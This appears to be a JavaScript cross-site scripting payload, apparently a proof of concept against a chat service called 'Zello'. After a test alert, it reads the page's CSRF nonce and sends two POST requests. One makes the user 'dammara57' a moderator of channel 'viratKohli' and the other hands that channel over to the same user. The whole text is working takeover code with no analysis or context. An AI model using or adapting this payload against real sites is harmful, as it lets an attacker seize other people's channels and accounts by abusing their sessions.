alert('Hello Ambush');
fetch('/user/add_moderator', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: new URLSearchParams({
    channel: 'viratKohli',
    user: 'dammara57',
    nonce: Zello.nonce
  })
})
.then(response => {
  console.log('Add Moderator Response Status:', response.status);
  
  if (response.status === 200) {
    console.log('First request successful, proceeding to pass_channel...');
    
    // Second POST request to /user/pass_channel
    return fetch('/user/pass_channel', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: new URLSearchParams({
        channel: 'viratKohli',
        user: 'dammara57',
        nonce: Zello.nonce
      })
    });
  } else {
    throw new Error('First request failed with status: ' + response.status);
  }
})
.then(response => {
  console.log('Pass Channel Response Status:', response.status);
  return response.text();
})
.then(data => {
  console.log('Pass Channel Response:', data);
})
.catch(error => {
  console.error('Error:', error);
});
